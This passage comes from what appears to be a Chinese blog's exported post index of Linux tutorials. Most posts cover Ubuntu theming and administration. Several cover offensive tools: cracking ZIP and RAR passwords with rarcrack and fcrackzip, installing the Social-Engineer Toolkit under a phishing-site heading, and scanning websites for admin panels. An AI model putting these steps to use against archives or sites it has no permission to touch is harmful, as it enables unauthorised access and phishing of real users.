ppa:noobslab/macbuntulengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install macbuntu-os-plank-theme-lts-v7 设置plank安装后搜索plank，鼠标点击plank，然后在图标上按住‘Ctrl’，点击鼠标右键，会出现菜单，选择perference就会出现下面的界面了，改成我们喜欢的theme。 将面板上的‘Ubuntu Desktop’文字换成‘Mac OS X’1234lengyue@ubuntu:~$ cd &amp;&amp; wget -O Mac.po http://drive.noobslab.com/data/Mac/change-name-on-panel/mac.polengyue@ubuntu:~$ cd /usr/share/locale/en/LC_MESSAGESlengyue@ubuntu:~$ sudo msgfmt -o unity.mo ~/Mac.polengyue@ubuntu:~$ rm ~/Mac.po 这个会在重启后才会生效，但是你不必现在重启，等会全部设置完毕后再重启就可以了。 启动器换苹果LOGO12lengyue@ubuntu:~$ wget -O launcher_bfb.png http://drive.noobslab.com/data/Mac/launcher-logo/apple/launcher_bfb.pnglengyue@ubuntu:~$ sudo mv launcher_bfb.png /usr/share/unity/icons/ 配置 Mac 字体123lengyue@ubuntu:~$ wget -O mac-fonts.zip http://drive.noobslab.com/data/Mac/macfonts.ziplengyue@ubuntu:~$ sudo unzip mac-fonts.zip -d /usr/share/fontslengyue@ubuntu:~$ sudo fc-cache -f -v 需要在unity-tweak-tool中进行修改，但是我个人认为还是Ubuntu自带的字体好看，你也可以根据自己喜好进行设置。 设置主题与图标1lengyue@ubuntu:~$ unity-tweak-tool 在Fonts选项里修改字体。 修改启动界面123lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/themes lengyue@ubuntu:~$ sudo apt-get update lengyue@ubuntu:~$ sudo apt-get install macbuntu-os-bscreen-lts-v7 重启系统1lengyue@ubuntu:~$ reboot 再次打开就是Mac OS X的样子了。我看到有人还有写修改Libreoffice图标的，我个人感觉没用，所以略去不写了，虽然这个office软件确实很好，但是并没有必要对他美化，保持原来的样子就可以了。 最好附几张我个人完成的桌面系统图片，仅供参考]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu桌面美化教程1-安装flatabulous扁平化主题]]></title>
    <url>%2F2018%2F04%2F04%2FUbuntu%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B1-%E5%AE%89%E8%A3%85flatabulous%E6%89%81%E5%B9%B3%E5%8C%96%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Linux的桌面美化其实比Windows系统的简单的多，当然服务器版是不需要桌面自然也是不需要美化的。但是我们作为普通用户，对桌面系统进行美化也是无可厚非的。我本人就不太喜欢Ubuntu默认的桌面。对于一个有强迫症的人来说，不美化用着都感觉难受，所以我安装系统后第一件事就是进行美化。 下载安装Ubuntu主题配置工具unity-tweak-tool1lengyue@ubuntu:~$ sudo apt-get install unity-tweak-tool 添加arc-flatabulous-theme主题资源1lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/themes 添加ultra-flat-icons图标主题资源1lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/icons 更新源列表并且使资源生效1lengyue@ubuntu:~$ sudo apt-get update 安装flatabulous-theme主题1lengyue@ubuntu:~$ sudo apt-get install arc-flatabulous-theme 安装ultra-flat-icons图标主题1lengyue@ubuntu:~$ sudo apt-get install ultra-flat-icons 打开unity-tweak-tool1lengyue@ubuntu:~$ unity-tweak-tool 回车即可打开。 配置主题与桌面图标和鼠标指针配置完成后立即生效，不需要重启系统。我本人一直用的就是这个主题，而且是gnome桌面。最后附上2张完成后的图片作为参考最后放一个主题链接:http://www.noobslab.com/这上面有很多主题可以用于Ubuntu的美化，可以自己尝试一下。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[man手册彩色高亮显示]]></title>
    <url>%2F2018%2F04%2F02%2Fman%E6%89%8B%E5%86%8C%E5%BD%A9%E8%89%B2%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[ubuntu使用man的时候默认是黑底灰字的.但是我们可以手动修改配置文件，让其彩色高亮显示。做法如下:12345678910lengyue@ubuntu:~$ gedit ~/.bashrc #打开配置文件# 在打开的文件中添加以下内容export LESS_TERMCAP_mb=$'\E[01;31m'export LESS_TERMCAP_md=$'\E[01;31m'export LESS_TERMCAP_me=$'\E[0m'export LESS_TERMCAP_se=$'\E[0m'export LESS_TERMCAP_so=$'\E[01;44;33m'export LESS_TERMCAP_ue=$'\E[0m'export LESS_TERMCAP_us=$'\E[01;32m'lengyue@ubuntu:~$ source .bashrc #使之生效 然后我们运行一下man命令，查看一下。1lengyue@ubuntu:~$ man ls]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[E: 软件包xxx需要重新安装，但是我无法找到相应的安装文件。]]></title>
    <url>%2F2018%2F04%2F01%2FE-%E8%BD%AF%E4%BB%B6%E5%8C%85xxx%E9%9C%80%E8%A6%81%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E6%97%A0%E6%B3%95%E6%89%BE%E5%88%B0%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%87%E4%BB%B6%E3%80%82%2F</url>
    <content type="text"><![CDATA[今天在kali上安装一款软件的时候遇到了“E: 软件包 sogoupinyin 需要重新安装，但是我无法找到相应的安装文件。”所以就此问题总结一下解决此问题的方法，我以自己的问题进行讲解，当然也适用于其他软件包，你如果遇到同样的问题，你只需要把sogoupinyin替换为你的软件即可。12345root@kali:~# cd /var/lib/dpkg/info ## 进入/var/lib/dpkg/info目录root@kali:/var/lib/dpkg/info# ls sogoupinyin* ## 列出当前目录下的带有sogoupinyin字样的文件，以*通配符进行快速匹配root@kali:/var/lib/dpkg/info# rm -rf sogoupinyin* ##删除所有当前目录下匹配到的sogoupinyin的文件root@kali:/var/lib/dpkg/info# cd ##回到主目录下root@kali:~# dpkg --remove --force-remove-reinstreq sogoupinyin ##强制移除出错的deb包的安装文件 现在你再安装其他软件或者进行更新就不会出任何问题了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用rarcrack暴力破解RAR，ZIP，7Z压缩包]]></title>
    <url>%2F2018%2F03%2F31%2FLinux%E4%B8%8B%E4%BD%BF%E7%94%A8rarcrack%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3RAR%EF%BC%8CZIP%EF%BC%8C7Z%E5%8E%8B%E7%BC%A9%E5%8C%85%2F</url>
    <content type="text"><![CDATA[今天提到的软件是rarcrack，该软件用于暴力破解压缩文件的密码，最新的版本支持RAR, ZIP, 7Z这三种类型的压缩包，其特点是可以使用多线程，而且可以随时暂停与继续(暂停时会在当前目录生成一个xml文件，里面显示了正在尝试的一个密码)。其官方主页: http://rarcrack.sourceforge.net/其下载地址: https://sourceforge.net/projects/rarcrack/?source=typ_redirectTips: 打开网站的时候可能会被浏览器识别为危险网站，拒绝打开，你只需要在高级设置里把网站加入白名单就可以了。 安装rarcrack官方给出的安装方法:123456789$ tar -xjf rarcrack-VERSION.tar.bz2$ cd rarcrack-VERSION$ make #你需要C编译器（GCC或任何编辑Makefile CC = your_c_compiler）$ make install``` ### 但是我个人还是推荐直接使用apt软件管理包进行安装的，因为在安装的时候会自动解决一些依赖问题。很方便也很快捷。这个软件是需要c编译环境的，如果你不能make安装，那么请检查你的环境是不是支持c编译环境，官方主页有需要的运行环境。下面我在自己的Ubuntu中进行下载安装。``` bashlengyue@ubuntu:~$ sudo apt-get install rarcrack 查看帮助:1lengyue@ubuntu:~$ rarcrack --help 可以看到只有三个参数:123--help: 查看帮助信息--type: 指定破解的压缩文件的类型--threads: 指定线程数 我事先准备了一个测试使用的zip文件，密码设置为123456.(如果你是下载的官网的bz2包的话，解压后会有三个供你测试使用的压缩文件)如图: 使用说明:在rarcrack运行的时候，会为你自动创建一个.xml文件。该文件与你破解的压缩文件在同一目录下。你也可以自己自定义该文件，使破解更加快速，以下是我导出的在初次使用自动创建的.xml文件。1234567lengyue@ubuntu:~$ cat test.zip.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;rarcrack&gt; &lt;abc&gt;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/abc&gt; &lt;current&gt;y8x&lt;/current&gt; &lt;good_password&gt;&lt;/good_password&gt;&lt;/rarcrack&gt; 线程数默认为2，最大线程数为12，请不要随便添加线程数以及超过该线程数。 纠正几点错误，很重要，仔细看。你如果查看过该软件的相关教程，你如果照做就会发现你会出很多错误。1.线程数设置过大，官方说明最大线程数为12，不知道他们哪来的几十的线程数。2.命令格式不对。eg：1rarcrack test.zip -threads 3 -type zip 有很多人会遇到下面的情况。这只是因为命令格式与参数不对，并不是什么没有提前设置.xml文件。原因就是根本没有阅读过官方文档或者help过。 接下来我演示正确的操作姿势先自定义.xml文件，使破解效率更高。12345678910lengyue@ubuntu:~$ gedit test.zip.xml&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;rarcrack&gt; &lt;abc&gt;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/abc&gt; &lt;current&gt;12345&lt;/current&gt; &lt;good_password&gt;&lt;/good_password&gt;&lt;/rarcrack&gt;lengyue@ubuntu:~$ rarcrack --threads 10 --type zip test.zip 我通过修改&lt;current&gt; &lt;/current&gt;中的值来提高效率，使之从12345开始进行枚举密码。你也可以修改&lt;abc&gt; &lt;/abc&gt;中的字符使枚举密码更加快速，比如我这个测试的文件密码为123456，你可以在知道密码信息的前提下，修改为0123456789，这样就不会去穷举大小写字母了，速度会更快。下面是破解成功的样子。扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Linux关机与重启的那些事]]></title>
    <url>%2F2018%2F03%2F30%2F%E5%85%B3%E4%BA%8ELinux%E5%85%B3%E6%9C%BA%E4%B8%8E%E9%87%8D%E5%90%AF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[首先说一句，不要认为关机就是直接关闭电源，很简单。如果你做运维的话，你就知道这种做法对你的服务器有多大伤害了。当然一个服务器是很少遇到关机的操作的，但是也许就会遇到特殊情况呢。因为Linux后台有很多进程正在运行，用户的数据还没有进行存储，强行关机会导致进程数据丢失，所以应该等数据全部写入再进行关机才是最正确的做法，并且强制关机还会影响系统的稳定性，还有可能造成系统的硬件损坏。 首先不管是重启系统还是关闭系统，首先要运行sync命令，把内存中的数据写到磁盘中，然后再运行以下提到的关机与重启命令。下面讲解一下关机与重启的命令 initinit命令是Linux下的进程初始化工具，init进程是所有Linux进程的父进程，它的进程号为1。init命令是Linux操作系统中不可缺少的程序之一，init进程是Linux内核引导运行的，是系统中的第一个进程。init定义了7个运行级别（runlevel），分别是：0 停机（千万不能把initdefault 设置为0）1 单用户模式2 多用户，没有 NFS(和级别3相似，会停止部分服务)3 完全多用户模式4 没有用到5 x11(Xwindow)6 重新启动（千万不要把initdefault 设置为6）实例:12init 0 #关机init 6 #重启 shutdown重要参数:[-t] 在改变到其它runlevel之前﹐告诉init多久以后关机。[-r] 重启计算器。[-k] 并不真正关机﹐只是送警告信号给每位登录者〔login〕。[-h] 关机后关闭电源〔halt〕。[-c] 取消目前正在执行的关机程序。、[-f] 在重启计算器〔reboot〕时忽略fsck[-F] 在重启计算器〔reboot〕时强迫fsck。[-time] 设定关机〔shutdown〕前的时间。实例:1234shutdown -h now #指定现在立刻关机shutdown +5 #5分钟后自动关机shutdown -r #关机后重启shutdown 16:00 #16:00关机 reboot实例:1reboot #立即重启 halt实例:12halt #关闭系统后关闭电源。halt -d #关闭系统，但不留下纪录 poweroff重要参数:-n：关闭操作系统时不执行sync操作；-w：不真正关闭操作系统，仅在日志文件“/var/log/wtmp”中；-d：关闭操作系统时，不将操作写入日志文件“/var/log/wtmp”中添加相应的记录；-f：强制关闭操作系统；-i：关闭操作系统之前关闭所有的网络接口；-h：关闭操作系统之前将系统中所有的硬件设置为备用模式。实例:1poweroff #立即关闭系统]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用kali破解zip文件密码]]></title>
    <url>%2F2018%2F03%2F29%2F%E7%94%A8kali%E7%A0%B4%E8%A7%A3zip%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[FCrackZip是一款快速免费的zip压缩文档密码破解工具,FCrackZip是一款开放源代码的软件,因此你可以依据自己的需求自由定制。FCrackZip 网站 : http://software.schmorp.de/pkg/fcrackzip.htmlFCrackZip的破解速度相当快，据说密码小于10位以下的，秒秒钟就能破解掉。主要参数:[-b|–brute-force] use brute force algorithm 暴破 [-D|–dictionary] use a dictionary 字典模式 [-B|–benchmark] execute a small benchmark 速度测试 [-c|–charset characterset] use characters from charset 指定字符类型（数字，字母，混合等） [-h|–help] 显示帮助信息 [–version] 显示fcrackzip的版本 [-V|–validate] 验证算法 [-v|–verbose] 可以更详细的显示破解信息 [-p|–init-password string] use string as initial password/file 指定开始字符（比如要只记得密码是５开头的６位纯数字，可以指定从５００００００开始破解，节约时间） [-l|–length min-max] check password with length min to max （指定密码长度区间） [-u|–use-unzip] use unzip to weed out wrong passwords （这个选项很很重要，很重要，可以显示出破解出的密码） [-m|–method num] use method number “num” (see below) （指定破解类型） [-2|–modulo r/m] only calculcate 1/m of the password file… the zipfiles to crack下面我展示一下简答的操作姿势:我事先压缩了一个图片作为测试使用，密码设置为12345678.然后打开kali进行破解。输入以下命令:1root@kali:~# fcrackzip -b -l 1-8 -u -c1 测试.zip -v 在这里我指定了一些重要的参数，必要的参数可以提高你的破解速度和正确性。-l 1-8 #指定密码长度为1-8位的-u #指定解压出来-c1 #指定密码类型为纯数字-v #指定了显示破解的详细信息基本没有用到一分钟就已经破解出来了。当然有时候我们得到的一些zip文件是根本不知道密码的任何信息的，那么我们只能指定-b参数进行破解了，这样的情况下由于并不知道密码的一些信息，所以破解是相当费时间的，需要耐心等待。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[升级到 Ubuntu 18.04 LTS 的理由，大波新特性到来]]></title>
    <url>%2F2018%2F03%2F29%2F%C2%96%E5%8D%87%E7%BA%A7%E5%88%B0-Ubuntu-18-04-LTS-%E7%9A%84%E7%90%86%E7%94%B1%EF%BC%8C%E5%A4%A7%E6%B3%A2%E6%96%B0%E7%89%B9%E6%80%A7%E5%88%B0%E6%9D%A5%2F</url>
    <content type="text"><![CDATA[随着 2018 年 4 月 24 日稳定版正式发布日期的临近，也是时候来仔细研究下 Canonical 最新 Linux 发行版 Ubuntu 18.04 LTS「Bionic Beaver」的最新功能特性了。LTS 版本每两年发布一次，而 Ubuntu 18.04 是自 2016 年以来的第一个长期支持版本。Ubuntun 长期支持版本可以获得 Canonical 官方长达五年的技术支持，这意味着在 2023 年之前所有用户都可以放心使用 Ubuntu 18.04 LTS。Ubuntu 18.04 LTS 被 Canonical 创始人 Mark Shuttleworth 命名为「Bionic Beaver，仿生海狸」，这主要是为了纪念 Ubuntu 人孜孜不倦的辛劳工作。所以，以海狸充满活力的态度，勤劳的本性，此次版本更新周期以这种哺乳动物作为吉祥物进行命名。我们为什么要升级到 Ubuntu 18.04 LTS 呢？ 让我们来看看系统极客为大家总结的8大理由。Ubuntu 18.04 中最有趣的新功能1.安全性增强首先，所有用户都应该定期升级当前的 Ubuntu 版本，以便从最新的安全补丁中受益。（系统更新可能适用于操作系统、驱动程序甚至底层硬件）值得指出的是，所有操作系统都是如此，无论是基于 Linux、Windows 还是macOS，定期更新都可以提高您计算机的安全性。但有一个潜在的安全问题应该注意，与微软的 Windows 10 操作系统类似，Canonical 打算从 Ubuntu 18.04 LTS 开始从用户的计算机收集一些数据。所收集的这些数据并不标示任何用户身份，只是建立计算机硬件、运行的 Ubuntu 版本、位置信息（可选）和一些其它数据的档案。2.GNOME正式抵达Ubuntu 18.04 LTS 发布的同时也带来了 GNOME 3.28，由于 GNOME 在 Ubuntu 17.10 中已经取代了 Unity（尽管 Unity 并未完全挂掉），因此 GNOME 也已经成为了 Ubuntu 系统默认的桌面环境。当然，如果你不喜欢使用 GNOME，其他 Ubuntu 桌面环境也是可用的，如：MATE。GNOME 正式来到 Ubuntu 18.04 LTS 桌面也标志着新统一风格定制的 GNOME 3.0 桌面在长期支持版本上得到支持，这也是升级到 Ubuntu 18.04 系统一个很好的理由。说明一句，在Ubuntu16.04 LTS中默认的还是unity桌面，但是我更喜欢gnome桌面。3.全新的图标集开源图标项目 Suru 已被纳入到 Ubuntu 18.04 LTS 操作系统当中，这些图标最初出现在现已废弃的 Ubuntu Touch 移动操作系统当中。（现在 UBPorts.com 的控制下）正如 Suru 官网所述，原始的移动应用程序图标已被重新用于与 GNOME 主题图标相对应。基于未发布的 Suru 概念，还添加了文件夹和文件类型图标。 此外，还创建了一个完整的符号图标集，其中有许多基于原始 Suru 系统的图标。4.彩色Emojis表情符号在个人 Linux 功能愿望清单中需求度可能不会很高，但不能否认表情符号现在是现代数字通信的一个重要组成部分。包括 Fedora 在内的许多其他流行 Linux 发行版很久以前就获得了对 emoji 的支持，在 Ubuntu 18.04 LTS 正式发布时，Ubuntu 用户也终于可以享受桌面应用程序中对彩色表情符号的开箱即用支持了。为确保平台之间的一致性， Ubuntu 18.04 LTS 将使用 Noto Color Emoji 字体，该字体支持最新 Unicode 版本中定义的所有表情符号。最新版本 Android 操作系统中使用了相同的表情符号字体，并且可以在 Noto Emoji GitHub 存储库中找到它的所有源图像。在 Ubuntu 18.04 LTS 中的 GTK 应用程序中添加表情符号将很简单，因为 Ubuntu 用户将能够唤出可搜索的表情符号选择器，所以无需记住其 Unicode 代码或名称即可轻松输入字形。5.新的「待办事项」应用程序「GNOME To Do」这一简单的应用程序已经成为上游 GNOME 核心体验的一部分，它将在 Ubuntu 18.04 LTS 中推出对应的「待办事项」应用程序，以帮助Ubuntu 用户管理个人任务。「GNOME To Do」的设计目的不是妨碍用户使用，它提供最基本的功能来实现，包括：快速编辑、管理列表，以及使用拖放重新排序任务。 每个任务可以分配不同的优先级和颜色以简化组织，并且「GNOME To Do」还能与 GNOME Online Accounts 集成，允许同步多个在线服务。6.「最小安装」选项不要将「Minimal Install 」最小化安装选项与 Ubuntu 18.04 最小化版本相混淆，Ubuntu 18.04 Ubiquity 安装程序增加了一个全新的「Minimal Install 」最小化安装选项，它可以将 Ubuntu 压缩为只有 30MB 的 containers/Docker、嵌入式 Linux 环境和其他相关用例，只需使用浏览器和实用程序即可安装最少的桌面环境。此安装选项可以除去 Thunderbird、Transmission、Rhythmbox、LibreOffice（包括语言包）、Cheese 和 Shotwell 等 80 项功能，在应用程序启动器中只留下 Firefox、Nautilus、Ubuntu 软件和帮助。7.Linux Kernel 4.15Ubuntu 18.04 LTS 还将附带了 Linux Kernel 4.15，其中包含针对 Spectre 和 Meltdown 错误的修复程序。除了 Specter 和 Meltdown 错误修复之外，Linux Kernel 4.15 还为 Raspberry Pi 7 英寸触摸屏提供原生支持，并支持安全加密虚拟化。8.Xorg显示服务器回归在过去几年中，Ubuntu 经历了一段艰难的时期，随着其移动版本的退出以及 Unity 的支持结束。 最大的障碍之一是在 Ubuntu 17.10 中默认切换到了 Wayland 显示服务器。 虽然它继续被指定为未来的显示服务器，但因缺少对 Wayland 应用程序的支持，导致不少用户切换回 Xorg 显示服务器。因此，Ubuntu 18.04 LTS 将 Xorg 恢复为了默认显示服务器。 但是，通过登录屏幕上的齿轮图标还是可以切换回 Wayland 滴。 注明:本篇文章为转载内容点此可查看原文最后补充几句个人想法，我本人是非常喜欢Ubuntu的，属于Ubuntu的忠实粉丝，不论是哪个版本发布，我都一直在关注，本次的18.04属于LTS版本，可以获得5年的技术支持，所以如果各位喜欢Ubuntu的话， 一定要下载这个版本，我也会在第一时间尝鲜的，到时候一定写篇关于新版Ubuntu的特点的文章来，也希望各位多多支持Ubuntu，Ubuntu是家庭桌面版排名第一的版本，非常适合使用。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu的管理员运行机制]]></title>
    <url>%2F2018%2F03%2F28%2FUbuntu%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Ubuntu并不像其他的Linux操作系统，在安装系统的时候自动为你分配一个root用户，Ubuntu的使用者都知道Ubuntu并没有分配root用户。在安装Ubuntu的时候会要你自己设置一个账户，该账户即是系统的管理员。在你初次打开终端的时候，会自动出现以下界面。该句话的意思是运行sudo命令作为系统管理员(root用户)，详情可以查看man sudo_root。现在我们输入1lengyue@ubuntu:~$ man sudo_root 查看详细信息。我本人已经将sudo_root的manual手册做了翻译，并且进行了以下几点总结:默认情况下，用户“root”的密码（系统管理员）被锁定。这意味着您不能以root身份登录或使用su命令。相反，该安装程序将设置sudo允许过程中创建的用户安装运行所有管理命令。这意味着，当需要root权限的时候在终端可以使用sudo命令。菜单中的所有程序都将使用图形。使用sudo命令的时候会提示输入密码。当sudo需要密码，它需要您的密码，这意味着不需要root密码。要运行一个需要root权限的命令，仅仅在该命令前面加上sudo就可以了。而你如果想要得到一个交互式的root shell，可以使用sudo -i.像下面这样。123lengyue@ubuntu:~$ sudo -i[sudo] lengyue 的密码： #在此输入你的用户密码确认即可root@ubuntu:~# 然后使用exit命令注销退出root。123root@ubuntu:~# exit注销lengyue@ubuntu:~$ 默认情况下，只有安装系统的用户才可以运行sudo。你如果需要添加更多的管理员，即其他用户也可以运行sudo，你要添加这些用户到sudo的group中。我们可以按照以下步骤进行操作:在终端中运行以下命令:1lengyue@ubuntu:~$ sudo adduser username sudo 在图像界面下，进行设置找到用户选项，先解锁所在用户。然后按照提示进行添加管理员，但是值得注意的是必须将你新设置的用户添加到管理员的group中，如图所示最后进行保存就可以了。Ubuntu禁用root用户的优点:1.用户不必记住一个额外的密码，它们是可能忘记。2.安装程序可以少问问题。3.它避免了“我可以做任何事”交互式登录默认情况下-你4.在发生重大更改之前，将提示输入密码，这会让你考虑你的后果。5.Sudo增加了一个命令的日志条目（S）运行（/var/log/messages中验证日志）。如果你陷入困境，你可以看到什么命令6.每一个试图用暴力强行进入你的系统的攻击者知道它有一个名为root的帐户，并且将首先尝试它。因为他们不知道你的其他用户的用户名是什么。7.允许短期或长期的管理权轻松转让。期间，通过添加和从组中删除用户而不是sudo。当您使用单个root密码，只有授权用户才是去更改根密码8.sudo可以设立一个更细致的安全策略。9.所述认证自动失效后很短的时间（可设置至期望的或0)；所以如果你离开后在终端运行命令，作为root用户使用sudo，不可能会离开你的根终端开放。但是我们也是可以重新启用root用户的(其实我个人一点也不推荐你这么做，因为根本没有必要还要承受很大的风险)12345lengyue@ubuntu:~$ sudo passwd root[sudo] lengyue 的密码：输入新的 UNIX 密码：重新输入新的 UNIX 密码：passwd：已成功更新密码 然后我们进入root用户:123lengyue@ubuntu:~$ su root密码：root@ubuntu:/home/lengyue# 我们也可以重新禁用root用户1lengyue@ubuntu:~$ sudo passwd -dl root 如果这个时候你再次进入root用户的话，你会发现你设置的root密码已经不能用了。 官网中有更为细致的介绍: 以下是地址https://help.ubuntu.com/community/RootSudo#Downsides_of_using_sudo 总的来说，Ubuntu的管理运行机制是非常人性化的，我个人是很认同这种管理机制的，确实很方便也很安全。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu显示网络已禁用]]></title>
    <url>%2F2018%2F03%2F27%2FUbuntu%E6%98%BE%E7%A4%BA%E7%BD%91%E7%BB%9C%E5%B7%B2%E7%A6%81%E7%94%A8%2F</url>
    <content type="text"><![CDATA[今天在本地搭建wordpress的时候，Ubuntu突然断网，我本人的Ubuntu网络连接是用的NAT模式。随后我赶紧查看是否是自己的主机不能上网了，但是主机是完全可以上网的。然后我决定采用桥接模式试试，但是还是不行。而且我发现在Ubuntu登陆界面显示的是网络已禁用。但是我本人并没有手动禁用网络。也就是说并不是本地网络的问题，是Ubuntu自身的网络连接出现了问题。随后我开始查找各种解决姿势。终于完美解决了这个问题。下面进行一下总结。WARNING:这个方法适用于解决网络突然从可用变不可用的情况(多是非正常关机的原因)，如果本来网络不可用。那么这个方法不适用。Tips:其原理就是删除原来的网络设置，然后让系统自动重建新的网络设置。在终端下输入如下命令:123sudo service network-manager stop #关闭network-manager网络设置sudo rm /var/lib/NetworkManager/NetworkManager.state #删除network-manager网络设置sudo service network-manager start #重启network-manager网络设置服务 随后你不需要重启Ubuntu就可以看到你的网络已经连接上了。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali制作钓鱼网站]]></title>
    <url>%2F2018%2F03%2F26%2FKali%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[https://github.com/trustedsec/social-engineer-toolkit1234567root@kali:~# git clone https://github.com/trustedsec/social-engineer-toolkit/ set/root@kali:~# lsroot@kali:~# cd set/root@kali:~/set# lsmodules README.md seautomate setoolkit seupdatereadme requirements.txt seproxy setup.py srcroot@kali:~/set# python setup.py install 安装完成，现在运行该程序。1root@kali:~# setoolkit 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无需ROOT在安卓手机上部署kali工具集教程1]]></title>
    <url>%2F2018%2F03%2F26%2F%E6%97%A0%E9%9C%80ROOT%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E9%83%A8%E7%BD%B2kali%E5%B7%A5%E5%85%B7%E9%9B%86%2F</url>
    <content type="text"><![CDATA[今天教大家在安卓上部署kali工具集。当然大家一定看过那些在手机上安装kali系统的教程，那些教程都是需要root。而今天这个教程是不需要root手机的。其实你如果不是什么玩机的高手的话，最好不要root手机，root后很多应用就会获得更高的权限，你的个人信息与数据就不安全了呢!首先你的手机需要安装一个叫做Termux的软件，这个软件在我看来简直是神器，比那些所谓的Linux模拟器好上100倍，而且他的操作姿势很多，还支持apt、pkg软件包管理，和Ubuntu的操作类似，这是官网:https://termux.com/ ，然后你可以通过阅读官方文档:https://wiki.termux.com/wiki/Main_Page 了解操作方法。你只能通过以下两种方式进行安装。这是F-Droid中的截图，以下都是需要进行安装的，这一套软件包才可以要你的termux使用起来更加简便轻快。下面开始安装toolss1234git clone https://github.com/AnonHackerr/toolss.gitcd toolsschmod +x Tools.pypython Tools.py 以下是安装视频。 然后我演示一下安装nmap。 安装sqlmap。http://player.youku.com/player.php/sid/XMzYwMzk0NTQ2OA==/v.swf 安装sqlmap有点慢，就不展示完了，你们自己在下面慢慢的安装就可以了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Termux</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Termux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali寻找网站后台]]></title>
    <url>%2F2018%2F03%2F25%2Fkali%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[首先从GitHub上clone下来1root@kali:~# git clone https://github.com/bdblackhat/admin-panel-finder.git 然后我们开始运行该程序。123root@kali:~# lsroot@kali:~# cd admin-panel-finder/root@kali:~/admin-panel-finder# python admin_panel_finder.py 然后在此处输入你要寻找后台的网站。静静等待就可以了。其实这个东西原理特别简单，在GitHub上放的有源码，有兴趣的可以去看看，这是地址：https://github.com/bdblackhat/admin-panel-finder就是穷举法破解网站后台，也就是用字典吧算是，把许多常用的管理后台地址放到程序里，然后用python脚本自动进行爆破后台，成功的几率还是在于字典的强大与否，如果你也懂python的话，你可以在这个程序的源码中添加自己的字典，可以使成功的几率变得更大。这个程序目前应该可能是已经不维护了吧，代码还是5年前上传的，所以如果你有兴趣，又对python很在行的话，可以来丰富完善一下该程序。扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过cdn，查找真实IP]]></title>
    <url>%2F2018%2F03%2F25%2F%E7%BB%95%E8%BF%87cdn%EF%BC%8C%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%2F</url>
